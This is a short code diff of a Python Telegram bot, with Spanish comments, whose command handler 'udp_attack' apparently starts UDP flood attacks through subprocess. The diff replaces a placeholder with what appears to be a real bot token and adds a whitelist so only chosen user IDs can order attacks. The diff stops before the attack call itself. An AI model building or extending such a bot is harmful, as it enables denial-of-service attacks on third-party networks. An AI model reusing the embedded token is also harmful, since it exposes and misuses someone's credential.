@@ -3,10 +3,19 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 import subprocess
 
 # Token del bot (obtén el token de @BotFather en Telegram)
-TOKEN = "TU_TOKEN_AQUÍ"
+TOKEN = "8019097232:AAGNUqNSWL_mUVCCupNZR6dd5ckOdzGmsT0"
+
+# Lista de usuarios permitidos (IDs de Telegram)
+users = ['3728288228']
 
 # Comando para iniciar un ataque UDP
 async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Verifica que el usuario esté autorizado
+    user_id = str(update.effective_user.id)
+    if user_id not in users:
+        await update.message.reply_text("No tienes permiso para usar este bot.")
+        return
+
     # Verifica que el usuario haya ingresado los parámetros necesarios
     if len(context.args) < 3:
         await update.message.reply_text(
